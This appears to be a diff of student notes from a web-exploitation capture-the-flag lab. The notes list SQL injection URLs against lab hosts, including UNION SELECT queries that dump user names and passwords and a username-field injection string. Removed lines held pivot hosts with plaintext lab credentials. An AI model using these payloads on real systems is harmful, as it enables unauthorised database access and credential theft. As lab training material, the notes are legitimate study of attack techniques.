@@ -2,7 +2,6 @@
 
 http://10.50.23.102/uniondemo.php?Selection=3&Submit=Submit
 http://10.50.23.102/uniondemo.php?Selection=3 OR 1=1&Submit=Submit
-
 http://10.50.23.102/uniondemo.php?Selection=3 UNION SELECT 1,2,3;
 http://10.50.23.102/uniondemo.php?Selection=3 UNION SELECT name,pass,id from session.user;#
 =====================================================================
@@ -23,10 +22,6 @@ http://10.50.23.102/uniondemo.php?Selection=3 UNION SELECT name,pass,id from ses
 
 ========================================================================
 //// SQL Flags \\\\
-Scheme of Maneuver:
->internet_grey_host: 10.50.28.45	student		e9YErLDvFlUWxX0
-->Pivot(Donovian_Webserver): 192.168.28.111:2222		comrade : StudentWebExploitPassword
--->T1(donovian-nla): 10.100.28.48:80
 
 Flag 1: On the DNLA site identify the flag using the Categories page.
 (in the url)
@@ -58,13 +53,6 @@ Flag 7: Find the flag associated with id 1337.
 Flag 8:
 (from the username field)
 Hacker', 'pass', 'qwer@gmail.com', 1);#
-
-==========================================================================================
-////XXS Flags\\\
-
-Pivot (Donovian_Webserver) 192.168.28.111 2222(SSH)		comrade :: StudentWebExploitPassword
-
-T1 (Donovian_MI_websvr) 10.100.28.40 4444(SSH)
 
 
 
